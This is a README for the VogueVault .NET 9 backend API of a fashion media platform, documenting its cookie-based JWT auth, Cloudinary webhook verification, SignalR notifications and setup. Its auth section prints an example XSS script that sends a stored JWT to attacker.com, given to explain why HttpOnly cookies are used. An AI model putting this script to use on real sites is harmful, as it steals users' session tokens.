<div align="center">

# VogueVault — Backend API

**Production-grade .NET 9 REST API for a fashion content platform**

*Built with enterprise patterns, real-time media processing, and security-first design*

[![CI](https://github.com/Omwangala/Fashion-creator-platform-backend/actions/workflows/ci.yml/badge.svg)](https://github.com/Omwangala/Fashion-creator-platform-backend/actions/workflows/ci.yml)
![.NET 9](https://img.shields.io/badge/.NET-9.0-512BD4?logo=dotnet)
![Tests](https://img.shields.io/badge/tests-19%20passing-brightgreen?logo=xunit)
![EF Core](https://img.shields.io/badge/EF%20Core-9.0-purple)
![SignalR](https://img.shields.io/badge/SignalR-real--time-blue)
![Cloudinary](https://img.shields.io/badge/Cloudinary-media-orange)
![License](https://img.shields.io/badge/license-MIT-blue)

</div>

---

## What Is This?

VogueVault is a fashion content platform where creators upload images and videos. This repository is the backend API — responsible for authentication, media ingestion via Cloudinary, real-time upload status via SignalR, and a resilient reconciliation system that self-heals lost webhooks.

The codebase was engineered with the following priorities in order:

1. **Correctness** — every edge case handled, no silent failures
2. **Security** — XSS-resistant auth, signed webhooks, replay attack protection
3. **Resilience** — background worker recovers uploads even when webhooks are lost
4. **Performance** — cursor pagination, DB indexes, split queries, no N+1s
5. **Observability** — structured logging via Serilog, health checks, CI/CD on every push

---

## Table of Contents

- [Architecture](#architecture)
- [Tech Stack](#tech-stack)
- [Key Engineering Decisions](#key-engineering-decisions)
- [Database Schema & Relationships](#database-schema--relationships)
- [Security Practices](#security-practices)
- [Media Upload Flow](#media-upload-flow)
- [Webhook Idempotency](#webhook-idempotency)
- [Real-Time Notifications (SignalR)](#real-time-notifications-signalr)
- [Reconciliation Worker](#reconciliation-worker)
- [Rate Limiting](#rate-limiting)
- [API Reference](#api-reference)
- [Running Locally](#running-locally)
- [Testing](#testing)
- [CI/CD Pipeline](#cicd-pipeline)
- [Environment Variables](#environment-variables)
- [Project Structure](#project-structure)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                            CLIENT LAYER                                  │
│              React Frontend / Mobile App / API Consumer                  │
└────────────────────────────────┬───────────────────────┬────────────────┘
                                 │                       │
                    HTTPS + HttpOnly Cookie        WebSocket (SignalR)
                    (JWT never in localStorage)    /hubs/upload
                                 │                       │
┌────────────────────────────────▼───────────────────────▼────────────────┐
│                         ASP.NET CORE PIPELINE                            │
│                                                                          │
│  GlobalExceptionHandler → CORS → HTTPS Redirect → RateLimiter           │
│                        → Authentication → Authorization                  │
│                                                                          │
│  ┌──────────────────┐  ┌──────────────────┐  ┌────────────────────────┐ │
│  │  AuthController  │  │  PostsController  │  │   WebhookController    │ │
│  │  POST /register  │  │  POST /posts      │  │   POST /webhook/       │ │
│  │  POST /login     │  │  GET  /posts      │  │         cloudinary     │ │
│  │  POST /logout    │  │  GET  /posts/{id} │  │                        │ │
│  │  GET  /me        │  │                   │  │   Signature verified   │ │
│  └────────┬─────────┘  └────────┬──────────┘  └───────────┬────────────┘ │
│           │                     │                          │             │
│  ┌────────▼─────────────────────▼──────────────────────────▼──────────┐ │
│  │                        SERVICE LAYER                                │ │
│  │                                                                     │ │
│  │  TokenService    PostService    ImageService    (WebhookService)    │ │
│  │  ─ CreateToken   ─ CreatePost   ─ UploadImage   inline in          │ │
│  │    JWT + claims  ─ GetAllPosts  ─ ValidateFile   controller        │ │
│  │                  ─ GetById      ─ Video/Image                      │ │
│  └────────┬──────────────┬──────────────────┬───────────────────────┘ │
│           │              │                  │                          │
│  ┌────────▼────┐  ┌──────▼───────┐  ┌──────▼──────┐  ┌────────────┐ │
│  │ AppDbContext│  │  SignalR Hub  │  │  Cloudinary  │  │Background  │ │
│  │ EF Core 9   │  │  UploadHub   │  │  .NET SDK    │  │Reconcilia- │ │
│  │ SQL Server  │  │              │  │              │  │tion Worker │ │
│  └────────┬────┘  └──────────────┘  └──────────────┘  └─────┬──────┘ │
│           │                                                   │        │
└───────────┼───────────────────────────────────────────────────┼────────┘
            │                                                   │
    ┌───────▼────────┐                                 ┌────────▼────────┐
    │   SQL Server   │                                 │   Cloudinary    │
    │   Database     │◄────────────────────────────────│   CDN / API     │
    └────────────────┘    Reconciliation queries        └─────────────────┘
```

---

## Tech Stack

| Layer | Technology | Why This Choice |
|---|---|---|
| Runtime | **.NET 9** | Latest release — top throughput benchmarks, native AOT ready |
| Web Framework | **ASP.NET Core** | Battle-tested, built-in DI, middleware pipeline |
| ORM | **Entity Framework Core 9** | Type-safe queries, migration history, LINQ composition |
| Database | **SQL Server** | ACID transactions, proven at scale, rich indexing |
| Media Platform | **Cloudinary** | CDN delivery, adaptive streaming, webhook events |
| Real-Time | **SignalR** | WebSocket abstraction with automatic fallbacks |
| Auth | **JWT + HttpOnly Cookies** | XSS-resistant — token invisible to JavaScript |
| Background Jobs | **IHostedService** | Built-in .NET — no external queue needed at this scale |
| Logging | **Serilog** | Structured logs — queryable in Datadog, ELK, Seq |
| Testing | **xUnit + FluentAssertions + Moq** | Industry standard — readable assertions, mock isolation |
| CI/CD | **GitHub Actions** | Native GitHub integration, runs on every push |

---

## Key Engineering Decisions

### Decision 1 — Cursor Pagination Over Offset

Most tutorials use offset pagination (`SKIP n TAKE m`). This is a trap.

```
❌ Offset Pagination — O(n) scan, gets slower as the table grows
───────────────────────────────────────────────────────────────
SELECT * FROM Posts
ORDER BY CreatedAt DESC
OFFSET 10000 ROWS FETCH NEXT 10 ROWS ONLY

The database still scans 10,000 rows to skip them.
At 1,000,000 rows, page 100 is catastrophically slow.
Also breaks when new posts are inserted mid-pagination.

✅ Cursor Pagination — O(log n) via index, constant performance
───────────────────────────────────────────────────────────────
SELECT TOP 10 * FROM Posts
WHERE CreatedAt < @cursor           ← uses IX_Post_UserId_CreatedAt index
ORDER BY CreatedAt DESC

Same execution time at row 1 and row 1,000,000.
New posts don't cause duplicate or skipped items.
```

Response shape:
```json
{
  "data": [...],
  "hasMore": true,
  "nextCursor": "2026-05-31T18:00:00Z"
}
```

Frontend passes `?before=nextCursor` on the next request.

---

### Decision 2 — Dual-Layer Media Validation

A file named `malware.exe` renamed to `photo.jpg` passes a naive extension check. A spoofed `Content-Type` header passes a naive MIME check. Both layers are required.

```
Client uploads file
        │
        ▼
┌───────────────────────────────────────┐
│         PostsController               │
│                                       │
│  ✓ File is not null                   │
│  ✓ File size ≤ 50MB                   │
│  ✓ ContentType in whitelist           │  ← First gate
│    (image/jpeg, image/png,            │
│     image/webp, video/mp4,            │
│     video/quicktime)                  │
└───────────────────┬───────────────────┘
                    │
                    ▼
┌───────────────────────────────────────┐
│           ImageService                │
│                                       │
│  ✓ File is not null or empty          │
│  ✓ File size ≤ 50MB                   │
│  ✓ ContentType in whitelist           │  ← Second gate
│  ✓ Extension in whitelist             │  ← Extension cross-check
│    (.jpg .jpeg .png .webp .mp4 .mov)  │
│                                       │
│  ContentType starts with "video/"     │
│    → VideoUploadParams                │  ← Correct Cloudinary type
│  Otherwise                            │
│    → ImageUploadParams                │
└───────────────────────────────────────┘
```

iPhone uploads `.mov` files with `video/quicktime` — both are explicitly whitelisted. Many backends miss this and reject iPhone uploads silently.

---

### Decision 3 — HttpOnly Cookie Auth (Not localStorage)

```
❌ localStorage — accessible to JavaScript
──────────────────────────────────────────
XSS vulnerability injected via comment or ad:
  <script>
    fetch('https://attacker.com?token=' + localStorage.getItem('jwt'))
  </script>
Token stolen. Account compromised. No defense possible.

✅ HttpOnly Cookie — invisible to JavaScript
──────────────────────────────────────────
Same XSS attack:
  <script>
    fetch('https://attacker.com?token=' + localStorage.getItem('jwt'))
  </script>
localStorage is empty. Cookie is not accessible.
Attacker finds nothing.
```

Cookie settings:
```
HttpOnly   = true   — JS cannot read it
Secure     = true   — HTTPS only
SameSite   = Strict — no cross-site sending
Expires    = 7 days — matches JWT expiry exactly
```

Token and cookie expiry are kept in sync via `Jwt:ExpiryDays` config — a mismatch would cause silent 401s after token expiry while the cookie remains.

---

### Decision 4 — Reconciliation Worker as Resilience Layer

Webhooks are unreliable. Networks drop. Servers restart mid-request. Cloudinary itself can have outages. Relying solely on webhooks means uploads can be permanently stuck.

```
Upload saved with Status = Uploading
           │
           ├─── Normal path ──► Webhook fires within seconds
           │                    Status → Ready
           │                    SignalR notifies client
           │
           └─── Failure path ─► Webhook lost (network, server restart, etc.)
                                 UploadReconciliationWorker fires every 5 min
                                 Finds posts stuck > 15 minutes
                                 Queries Cloudinary API directly
                                 Asset found → Status → Ready → SignalR notify
                                 Asset missing → Status → Failed → SignalR notify
```

This means the system self-heals even if every single webhook is lost. The worker is a safety net, not the primary path.

---

## Database Schema & Relationships

```
┌──────────────────────────────┐
│            Users             │
├──────────────────────────────┤
│ 🔑 Id           INT (PK)     │
│    Username     NVARCHAR     │◄── IX_User_Username (UNIQUE)
│    Email        NVARCHAR     │◄── IX_User_Email    (UNIQUE)
│    PasswordHash NVARCHAR     │
│    CreatedAt    DATETIME     │
└──────────────┬───────────────┘
               │ 1
               │
               │ N  (one user → many posts)
               │    UserId is nullable — post survives user deletion
               ▼
┌──────────────────────────────┐
│             Posts            │
├──────────────────────────────┤
│ 🔑 Id           INT (PK)     │
│    MediaUrl     NVARCHAR     │
│    Caption      NVARCHAR     │
│    MediaType    NVARCHAR     │  "image" | "video"
│    PublicId     NVARCHAR     │◄── IX_Post_PublicId (UNIQUE)
│    Status       INT (enum)   │◄── IX_Post_Status
│    CreatedAt    DATETIME     │◄── IX_Post_UserId_CreatedAt (COMPOSITE)
│    LastUpdatedAt DATETIME    │◄── IX_Post_Status_CreatedAt (COMPOSITE)
│ 🔗 UserId       INT? (FK)    │
└──────────────────────────────┘

┌──────────────────────────────┐     ┌──────────────────────────────┐
│       UploadStatus (enum)    │     │   ProcessedWebhookEvents      │
├──────────────────────────────┤     ├──────────────────────────────┤
│  0 = Pending                 │     │ 🔑 Id          NVARCHAR (PK)  │
│  1 = Uploading               │     │    ProcessedAt DATETIME       │
│  2 = Ready                   │     │                               │
│  3 = Failed                  │     │  Id = Cloudinary's            │
└──────────────────────────────┘     │  notification_id              │
                                     │  ValueGeneratedNever()        │
                                     │  — DB never auto-generates    │
                                     └──────────────────────────────┘

Index Strategy:
────────────────────────────────────────────────────────────
IX_User_Username          UNIQUE   — Every login hits this
IX_User_Email             UNIQUE   — Every registration hits this
IX_Post_PublicId          UNIQUE   — Every webhook lookup hits this
IX_Post_Status                     — Feed queries filter by Ready
IX_Post_UserId_CreatedAt  COMPOSITE — Cursor pagination (primary query)
IX_Post_Status_CreatedAt  COMPOSITE — Reconciliation worker query
```

---

## Security Practices

### 1. Authentication Pipeline

```
POST /api/auth/login
        │
        ▼
  Normalize username (ToLower().Trim())
  ← Prevents "Admin" vs "admin" duplicate accounts
        │
        ▼
  SELECT * FROM Users WHERE Username = @normalizedUsername
  ← Hits IX_User_Username index — no table scan
        │
        ▼
  BCrypt.Verify(inputPassword, storedHash)
        │
        ├── Pass → CreateToken(userId, username)
        │          JWT: HS256, Issuer, Audience, 7-day expiry
        │          ClockSkew = Zero (strict expiry)
        │          Set-Cookie: vault_session=<jwt>; HttpOnly; Secure; SameSite=Strict
        │
        └── Fail → 401 "Invalid credentials provided."
                   ← Generic message — never reveals which field failed
                   ← Prevents username enumeration attacks
```

### 2. Webhook Signature Verification + Replay Attack Protection

```
Incoming POST /api/webhook/cloudinary
        │
        ▼
  Read raw request body as string
  ← Must read raw body BEFORE deserialization
  ← Signature is computed over exact bytes sent
        │
        ▼
  Read X-Cld-Signature header
  Read X-Cld-Timestamp header
        │
        ▼
  Parse timestamp as Unix seconds
  Check: |UtcNow - timestamp| < 15 minutes
  ← Replay attack protection
  ← Old signatures cannot be replayed even if intercepted
        │
        ▼
  Compute: SHA1(rawBody + timestamp + ApiSecret)
  Compare: computed == X-Cld-Signature
        │
        ├── Mismatch → 401 Unauthorized
        │              Log warning (possible spoofing attempt)
        │
        └── Match → Process webhook
```

### 3. Password Policy

```
Enforced via [RegularExpression] on RegisterDto:
  ^(?=.*[a-z])           — at least 1 lowercase
   (?=.*[A-Z])           — at least 1 uppercase
   (?=.*\d)              — at least 1 digit
   (?=.*[@$!%*?&])       — at least 1 special character
   [A-Za-z\d@$!%*?&]     — character whitelist
   {8,}$                 — minimum 8 characters

BCrypt.HashPassword() — NEVER stored in plaintext
BCrypt.Verify()       — constant-time comparison (no timing attacks)
```

### 4. Error Handling

```
Production error responses NEVER expose:
  ✗ Stack traces
  ✗ Database connection strings
  ✗ Internal file paths
  ✗ Which validation field failed (auth)

Global exception handler returns:
  { "error": "An unexpected error occurred. Please try again later." }

Internal errors are logged via Serilog for operator visibility.
```

---

## Media Upload Flow

```
 Client                Controller           ImageService         Cloudinary         Database          SignalR
   │                       │                     │                   │                 │                 │
   │──POST /api/posts──────►│                     │                   │                 │                 │
   │  multipart/form-data   │                     │                   │                 │                 │
   │                        │─validate file───────►                   │                 │                 │
   │                        │  size, MIME, ext    │                   │                 │                 │
   │                        │                     │─upload────────────►                 │                 │
   │                        │                     │  Image/Video      │                 │                 │
   │                        │                     │  UploadParams     │                 │                 │
   │                        │                     │◄─PublicId+URL─────│                 │                 │
   │                        │                     │                   │                 │                 │
   │                        │──────────────────────────────────────────────SavePost─────►                 │
   │                        │                     │  Status=Uploading │                 │                 │
   │◄─200 OK (post data)────│                     │                   │                 │                 │
   │                        │                     │                   │                 │                 │
   │  [seconds later]       │                     │   Cloudinary      │                 │                 │
   │                        │◄────────────────────────────────────────POST webhook──────────────────────  │
   │                        │  Verify signature   │                   │                 │                 │
   │                        │  Check idempotency  │                   │                 │                 │
   │                        │──────────────────────────────────────────────Update────────►                │
   │                        │                     │   Status=Ready    │                 │                 │
   │                        │──────────────────────────────────────────────────────────────UploadComplete─►│
   │◄─────────────────────────────────────────────────────────────────────────────────────push────────────│
```

---

## Webhook Idempotency

Cloudinary guarantees **at-least-once** delivery — the same webhook can arrive multiple times. Without idempotency this causes:
- Duplicate SignalR notifications
- Race conditions on post updates
- Unnecessary DB writes

**The solution: `ProcessedWebhookEvents` table**

```
Webhook arrives with NotificationId: "notif_abc123"
        │
        ▼
  SELECT * FROM ProcessedWebhookEvents WHERE Id = 'notif_abc123'
        │
        ├── Found → Return 200 "Already processed."
        │           ← No further action. Client won't be double-notified.
        │
        └── Not found → BEGIN TRANSACTION
                          UPDATE Post SET Status = Ready
                          INSERT ProcessedWebhookEvent (Id = 'notif_abc123')
                        COMMIT
                        → Notify client via SignalR
                        ← Atomic: both succeed or both fail
```

Result: The same webhook can arrive 100 times. The client is notified exactly once.

The `ProcessedWebhookEvent.Id` is Cloudinary's `notification_id` — configured as `ValueGeneratedNever()` in EF Core so the database never tries to auto-generate it.

---

## Real-Time Notifications (SignalR)

Instead of polling the API every few seconds ("is my upload done?"), the client connects once and receives a push notification the moment the status changes.

```
Client                                    Server
  │                                          │
  │──GET /hubs/upload?access_token=<jwt>────►│
  │   WebSocket upgrade                      │
  │                                          │─AddToGroupAsync("user-42")
  │                                          │
  │  [Upload completes via webhook]          │
  │                                          │─_hubContext.Clients
  │                                          │   .Group("user-42")
  │                                          │   .SendAsync("UploadComplete", {
  │                                          │      postId: 123,
  │                                          │      mediaUrl: "https://cdn...",
  │                                          │      status: "Ready"
  │                                          │   })
  │◄─UploadComplete push────────────────────│
  │   (no polling required)                  │
```

Groups are keyed by `UserId` (not username) — usernames can change, IDs never do.

SignalR auth reads the JWT from the `access_token` query parameter for WebSocket connections (cookies aren't sent on WS upgrade in all browsers). The same JWT validation middleware handles both HTTP and WebSocket connections.

---

## Reconciliation Worker

```csharp
// Runs every 5 minutes as a BackgroundService
// Handles the case where webhooks are lost

Every 5 minutes:
  ┌─────────────────────────────────────────────────────┐
  │  Find posts WHERE:                                   │
  │    Status = Uploading                                │
  │    AND CreatedAt < (UtcNow - 15 minutes)            │
  │  LIMIT 100  ← batch cap prevents memory spikes      │
  │  Uses IX_Post_Status_CreatedAt composite index       │
  └──────────────────────────┬──────────────────────────┘
                             │
                             ▼ For each stuck post:
  ┌─────────────────────────────────────────────────────┐
  │  Query Cloudinary: GetResource(post.PublicId)        │
  │                                                      │
  │  HTTP 200 → Asset exists (webhook was lost)          │
  │    Post.Status    = Ready                            │
  │    Post.MediaUrl  = resourceResult.SecureUrl         │
  │    Post.LastUpdatedAt = UtcNow                       │
  │    → SignalR: SendAsync("UploadComplete", ...)       │
  │                                                      │
  │  HTTP 404 → Asset never arrived (upload failed)      │
  │    Post.Status    = Failed                           │
  │    Post.LastUpdatedAt = UtcNow                       │
  │    → SignalR: SendAsync("UploadFailed", ...)         │
  └──────────────────────────┬──────────────────────────┘
                             │
                             ▼
  SaveChangesAsync() ← Single save for all posts in batch
```

The worker uses `IServiceProvider` (not direct `DbContext` injection) because `BackgroundService` is a singleton and `DbContext` is scoped — a common .NET mistake avoided here.

`OperationCanceledException` is caught separately from general exceptions so clean shutdowns don't log as errors.

---

## Rate Limiting

```
┌─────────────────────────────────────────────────────────┐
│                     LoginPolicy                          │
│  Applied to: POST /api/auth/login                        │
│  Window:     1 minute                                    │
│  Limit:      5 requests                                  │
│  Queue:      0 (instant reject — no waiting)             │
│  Purpose:    Brute force attack prevention               │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                    GeneralPolicy                         │
│  Applied to: All other controller endpoints              │
│  Window:     1 minute                                    │
│  Limit:      60 requests                                 │
│  Queue:      0                                           │
│  Purpose:    General API abuse prevention                │
└─────────────────────────────────────────────────────────┘

Both return on rejection:
  HTTP 429 Too Many Requests
  { "error": "Too many requests. Please slow down." }
```

---

## API Reference

### Base URL

```
Development:  http://localhost:5163
Swagger UI:   http://localhost:5163/swagger
Health check: http://localhost:5163/health
```

### Authentication

All endpoints except `POST /register` and `POST /login` require the `vault_session` cookie set automatically on login.

---

### Auth — `POST /api/auth/register`

Register a new user account.

```
POST /api/auth/register
Content-Type: application/json

{
  "username": "johndoe",
  "email":    "john@example.com",
  "password": "Secret@123"
}

Validation:
  username  — 3 to 20 characters
  email     — valid email format
  password  — min 8 chars, uppercase, lowercase, number, special char

200 OK
{ "message": "Access credentials created." }

400 Bad Request
{ "message": "Identity already archived." }    ← username taken
{ "message": "Email already in use." }         ← email taken
{ "errors": { "Password": ["..."] } }          ← validation failure
```

---

### Auth — `POST /api/auth/login`

```
POST /api/auth/login
Content-Type: application/json
Rate limit: 5 requests/minute

{
  "username": "johndoe",
  "password": "Secret@123"
}

200 OK
{ "message": "Access Granted." }
Set-Cookie: vault_session=<jwt>; HttpOnly; Secure; SameSite=Strict; Expires=7days

401 Unauthorized
{ "message": "Invalid credentials provided." }
← Same message whether username or password is wrong
← Prevents username enumeration

429 Too Many Requests
{ "error": "Too many requests. Please slow down." }
```

---

### Auth — `GET /api/auth/me`

Returns the currently authenticated user from JWT claims. **No database hit.**

```
GET /api/auth/me
Cookie: vault_session=<jwt>

200 OK
{
  "id":       "1",
  "username": "johndoe"
}

401 Unauthorized  ← no cookie or expired token
```

---

### Auth — `POST /api/auth/logout`

```
POST /api/auth/logout
Cookie: vault_session=<jwt>

204 No Content
Set-Cookie: vault_session=; Expires=past; HttpOnly; Secure; SameSite=Strict
← Cookie cleared with matching options — browser guaranteed to remove it
```

---

### Posts — `POST /api/posts`

Upload media and create a post. File is uploaded to Cloudinary; post is saved with `Status: Uploading`. Final `Status: Ready` is set asynchronously via webhook or reconciliation worker.

```
POST /api/posts
Cookie: vault_session=<jwt>
Content-Type: multipart/form-data
Max request size: 50MB

Form fields:
  MediaFile   File      required  Allowed: JPEG, PNG, WebP, MP4, MOV
  Caption     string    optional  Max 2200 characters
  MediaType   string    required  "image" or "video"

200 OK
{
  "id":        1,
  "mediaUrl":  "https://res.cloudinary.com/voguevault/image/upload/v1/...",
  "caption":   "Spring collection",
  "mediaType": "image",
  "createdAt": "2026-05-31T19:00:00Z",
  "username":  "johndoe"
}

400 Bad Request
  "No file provided."
  "File size exceeds the 50MB limit."
  "File type not supported. Allowed: JPEG, PNG, WebP, MP4, MOV."

401 Unauthorized  ← not logged in
429 Too Many Requests
500 Internal Server Error
  { "error": "An unexpected error occurred. Please try again." }
```

---

### Posts — `GET /api/posts`

Returns a paginated feed of `Ready` posts ordered by newest first. Uses cursor-based pagination — pass `nextCursor` from the previous response as `before` to get the next page.

```
GET /api/posts?before=<ISO8601>&pageSize=<int>
Cookie: vault_session=<jwt>

Query parameters:
  before    datetime  optional  Cursor — returns posts before this timestamp
  pageSize  int       optional  Default: 10, Max: 50

200 OK
{
  "data": [
    {
      "id":        1,
      "mediaUrl":  "https://res.cloudinary.com/...",
      "caption":   "Spring collection",
      "mediaType": "image",
      "createdAt": "2026-05-31T19:00:00Z",
      "username":  "johndoe"
    }
  ],
  "hasMore":    true,
  "nextCursor": "2026-05-31T18:00:00Z"
}

Pagination:
  First page:  GET /api/posts?pageSize=10
  Next page:   GET /api/posts?before=2026-05-31T18:00:00Z&pageSize=10
  Last page:   hasMore = false

Note: Only Status=Ready posts appear. Pending/Uploading/Failed posts
are never surfaced in the public feed.
```

---

### Posts — `GET /api/posts/{id}`

```
GET /api/posts/1
Cookie: vault_session=<jwt>

200 OK
{
  "id":        1,
  "mediaUrl":  "https://res.cloudinary.com/...",
  "caption":   "Spring collection",
  "mediaType": "image",
  "createdAt": "2026-05-31T19:00:00Z",
  "username":  "johndoe"
}

404 Not Found
{ "error": "Post 1 not found." }
```

---

### Webhook — `POST /api/webhook/cloudinary`

This endpoint is called by Cloudinary — not by API consumers. It receives upload completion events, verifies the signature, checks idempotency, updates post status, and pushes a SignalR notification.

```
POST /api/webhook/cloudinary
Content-Type: application/json
X-Cld-Signature: <sha1-hex>
X-Cld-Timestamp: <unix-timestamp>

Request body (sent by Cloudinary):
{
  "PublicId":          "voguevault/abc123",
  "SecureUrl":         "https://res.cloudinary.com/...",
  "NotificationType":  "upload",
  "NotificationId":    "notif_abc123"
}

200 OK  (success)
{ "message": "Post status updated." }

200 OK  (already processed — idempotent)
{ "message": "Already processed." }

200 OK  (unhandled event type)
{ "message": "Event type not handled." }

200 OK  (unknown PublicId — post may have been deleted)
{ "message": "Post not found — may have been deleted." }
← Returns 200 to prevent Cloudinary infinite retry loop

401 Unauthorized  (invalid or missing signature)
{ "error": "Invalid webhook signature." }

400 Bad Request  (malformed JSON)
{ "error": "Invalid payload format." }

Side effects on successful processing:
  1. post.Status    → Ready
  2. post.MediaUrl  → SecureUrl from Cloudinary
  3. ProcessedWebhookEvent inserted (idempotency record)
  4. SignalR "UploadComplete" pushed to post owner's group
  All in a single atomic SaveChangesAsync()
```

---

### SignalR Hub — `/hubs/upload`

```
Connection:
  const connection = new HubConnectionBuilder()
    .withUrl("/hubs/upload?access_token=" + jwtToken)
    .withAutomaticReconnect()
    .build();

Events received by client:

  "UploadComplete"
  {
    "postId":   1,
    "mediaUrl": "https://res.cloudinary.com/...",
    "status":   "Ready"
  }

  "UploadFailed"
  {
    "postId": 1,
    "status": "Failed"
  }
```

---

### Health Check — `GET /health`

```
GET /health

200 Healthy   ← API running, database reachable
503 Unhealthy ← Database unreachable (connection string, network, SQL Server down)
```

Used by load balancers, uptime monitors, and deployment pipelines to verify service health.

---

### Error Response Format

All error responses follow a consistent shape:

```json
{ "error": "Human-readable message" }
```

| Status | Meaning |
|---|---|
| `400` | Validation failed or bad request |
| `401` | Missing or invalid authentication |
| `404` | Resource not found |
| `429` | Rate limit exceeded |
| `500` | Internal error — details in server logs |

---

## Running Locally

### Prerequisites

- [.NET 9 SDK](https://dotnet.microsoft.com/download/dotnet/9.0)
- SQL Server (local install or Docker)
- [Cloudinary account](https://cloudinary.com) — free tier is sufficient

### Setup

```bash
# Clone
git clone https://github.com/Omwangala/Fashion-creator-platform-backend.git
cd Fashion-creator-platform-backend/backend

# Copy example config
cp appsettings.Example.json appsettings.Development.json
```

Edit `appsettings.Development.json`:

```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=localhost;Database=VogueVault;Trusted_Connection=True;TrustServerCertificate=True;"
  },
  "Jwt": {
    "Key":        "your-secret-key-minimum-32-characters-long!!",
    "Issuer":     "voguevault-api",
    "Audience":   "voguevault-client",
    "ExpiryDays": 7
  },
  "CloudinarySettings": {
    "CloudName": "your-cloud-name",
    "ApiKey":    "your-api-key",
    "ApiSecret": "your-api-secret"
  },
  "Frontend": {
    "Url": "http://localhost:5173"
  }
}
```

```bash
# Run migrations
dotnet ef database update

# Start API
dotnet run

# Available at:
# http://localhost:5163
# http://localhost:5163/swagger   ← Swagger UI (development only)
# http://localhost:5163/health    ← Health check
```

---

## Testing

```bash
# Run all tests (19 total)
dotnet test VogueVault.sln --verbosity normal

# Unit tests only
dotnet test backend.Tests/backend.Tests.csproj

# Integration tests only
dotnet test backend.IntegrationTests/backend.IntegrationTests.csproj

# With coverage
dotnet test VogueVault.sln --collect:"XPlat Code Coverage"
```

### Test Coverage

| Project | Tests | Coverage |
|---|---|---|
| `backend.Tests` | 16 unit tests | TokenService, PostService, ImageService, AuthController, PostsController, WebhookController |
| `backend.IntegrationTests` | 3 integration tests | Full auth flow, post creation with real file upload, webhook end-to-end |
| **Total** | **19 tests** | |

Integration tests run against an in-memory database and a fake `ImageService` — no real Cloudinary calls, no SQL Server required. The test host spins up the full ASP.NET Core pipeline including middleware, auth, and rate limiting.

---

## CI/CD Pipeline

```
git push
    │
    ▼
GitHub Actions triggered (.github/workflows/ci.yml)
    │
    ├── Checkout code
    ├── Setup .NET 9
    ├── Restore NuGet packages
    ├── Build (Release)
    ├── Run 16 unit tests
    ├── Run 3 integration tests
    │
    ├── All pass ✅ → ready for deployment
    └── Any fail ❌ → pipeline blocked, push rejected
```

Pipeline runs on:
- Every push to `main`, `master`, `develop`
- Every pull request targeting `main` or `master`

No secrets are hardcoded — test configuration uses `appsettings.Testing.json` with dummy values. Production secrets are injected via environment variables at the hosting layer.

---

## Environment Variables

All secrets are injected via environment variables in production — never in committed files.

| Variable | Description |
|---|---|
| `ConnectionStrings__DefaultConnection` | SQL Server connection string |
| `Jwt__Key` | Signing key — minimum 32 characters |
| `Jwt__Issuer` | JWT issuer claim (e.g. `voguevault-api`) |
| `Jwt__Audience` | JWT audience claim (e.g. `voguevault-client`) |
| `Jwt__ExpiryDays` | Token lifetime in days |
| `CloudinarySettings__CloudName` | Cloudinary cloud name |
| `CloudinarySettings__ApiKey` | Cloudinary API key |
| `CloudinarySettings__ApiSecret` | Cloudinary API secret — used for webhook signature verification |
| `Frontend__Url` | Allowed CORS origin |

`.NET` uses `__` (double underscore) as the environment variable hierarchy separator, mapping to nested JSON keys.

---

## Project Structure

```
Fashion-creator-platform-backend/
│
├── backend/                              ← Main API project
│   ├── Controllers/
│   │   ├── AuthController.cs            — Register, Login, Logout, Me
│   │   ├── PostsController.cs           — Feed + media upload
│   │   └── WebhookController.cs        — Cloudinary webhook handler
│   │
│   ├── Services/
│   │   ├── ITokenService.cs / TokenService.cs       — JWT creation
│   │   ├── IPostService.cs  / PostService.cs        — Post business logic
│   │   ├── IImageService.cs / ImageService.cs       — Cloudinary upload + validation
│   │   └── UploadReconciliationWorker.cs            — Background recovery
│   │
│   ├── Hubs/
│   │   └── UploadHub.cs                — SignalR hub (real-time notifications)
│   │
│   ├── Models/
│   │   ├── User.cs
│   │   ├── Post.cs
│   │   ├── ProcessedWebhookEvent.cs
│   │   └── UploadStatus.cs             — Pending, Uploading, Ready, Failed
│   │
│   ├── DTOs/                           — Request/response contracts
│   │   ├── RegisterDto.cs              — Validation attributes
│   │   ├── LoginDto.cs
│   │   ├── CreatePostDto.cs
│   │   ├── PostResponseDto.cs
│   │   ├── PostCreationRequest.cs
│   │   └── UploadResultDto.cs
│   │
│   ├── Data/
│   │   └── AppDbContext.cs             — EF Core context, indexes, SaveChangesAsync override
│   │
│   ├── Config/
│   │   └── CloudinarySettings.cs       — Strongly-typed config binding
│   │
│   ├── Migrations/                     — EF Core migration history
│   ├── Program.cs                      — App composition root
│   ├── appsettings.json                — Placeholder config (no real secrets)
│   ├── appsettings.Testing.json        — Test-safe config (dummy values)
│   └── appsettings.Example.json        — Developer onboarding template
│
├── backend.Tests/                      ← Unit test project (16 tests)
│   ├── Controllers/
│   │   ├── AuthControllerTests.cs
│   │   ├── PostsControllerTests.cs
│   │   └── WebhookControllerTests.cs
│   └── Services/
│       ├── TokenServiceTests.cs
│       ├── PostServiceTests.cs
│       └── ImageServiceTests.cs
│
├── backend.IntegrationTests/           ← Integration test project (3 tests)
│   ├── CustomWebApplicationFactory.cs  — Full ASP.NET Core test host
│   ├── FakeImageService.cs             — Cloudinary stub
│   ├── AuthIntegrationTests.cs
│   ├── PostsIntegrationTests.cs
│   └── WebhookIntergrationTests.cs
│
├── .github/
│   └── workflows/
│       └── ci.yml                      ← GitHub Actions pipeline
│
└── VogueVault.sln                      ← Solution file (all three projects)
```

---

<div align="center">

Built by [Omwangala](https://github.com/Omwangala)

*Engineering precision meets fashion creativity.*

</div>
